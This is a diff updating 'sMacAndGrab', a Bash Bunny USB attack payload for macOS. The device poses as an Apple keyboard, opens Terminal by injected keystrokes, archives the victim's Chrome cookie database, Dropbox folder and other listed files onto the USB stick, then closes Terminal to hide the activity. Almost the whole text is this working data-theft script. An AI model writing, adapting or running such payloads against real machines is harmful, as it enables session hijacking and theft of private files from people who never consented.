@@ -3,7 +3,7 @@
 # Title:         sMacAndGrab
 # Author:        audibleblink
 # Target:      macOS
-# Version:       1.0
+# Version:       1.1
 #
 # Backup a list of files from macOS
 #
@@ -11,15 +11,18 @@
 # Green...............Finished
 
 LED G R 500
-ATTACKMODE HID STORAGE
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
 
+# make the loot directory on the BashBunny
 mkdir -p /root/udisk/loot/sMacAndGrab
 
-# Unknown devices mount as NO NAME
-dev_name="NO NAME"
-lootdir="\"/Volumes/$dev_name/loot/sMacAndGrab\""
+# mounted device name
+dev_name="BashBunny"
 
-# Add your files here
+# loot directory when mounted on the mac
+lootdir="/Volumes/$dev_name/loot/sMacAndGrab"
+
+# Add files, folders, or commands that return filenames
 files_to_copy=(
 "\"~/Library/Application Support/Google/Chrome/Default/Cookies\"" # Quote paths with spaces
 "~/Dropbox"
@@ -31,9 +34,12 @@ QUACK DELAY 1000
 QUACK STRING terminal
 QUACK ENTER
 QUACK DELAY 4000
+# the more files in $files to copy, the longer tar will take to compress
+# one-liner because we want the move command to wait for tar to finish
 QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
 QUACK ENTER
 
+# sync the filesystem
 sync
 LED G
 
